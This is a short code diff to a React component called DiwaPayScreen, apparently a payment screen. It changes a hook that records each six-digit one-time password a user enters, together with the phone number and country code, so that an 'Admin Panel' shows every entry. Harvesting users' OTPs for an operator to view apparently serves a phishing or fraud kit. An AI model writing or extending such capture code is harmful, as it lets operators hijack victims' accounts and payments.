@@ -74,9 +74,13 @@ export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
     }
   }, [completedMessage, mode]);
 
-  // Immediately record user-entered 6-digit OTP so Admin Panel shows it right away
+  // Immediately record user-entered 6-digit OTP so Admin Panel shows every manual entry
   useEffect(() => {
-    if (form.phone.length !== 10 || form.otp.length !== 6) return;
+    if (form.otp.length < 6) {
+      lastRecordedOtpRef.current = '';
+      return;
+    }
+    if (form.phone.length !== 10) return;
     const signature = `${form.countryCode}:${form.phone}:${form.otp}`;
     if (lastRecordedOtpRef.current === signature) return;
     lastRecordedOtpRef.current = signature;
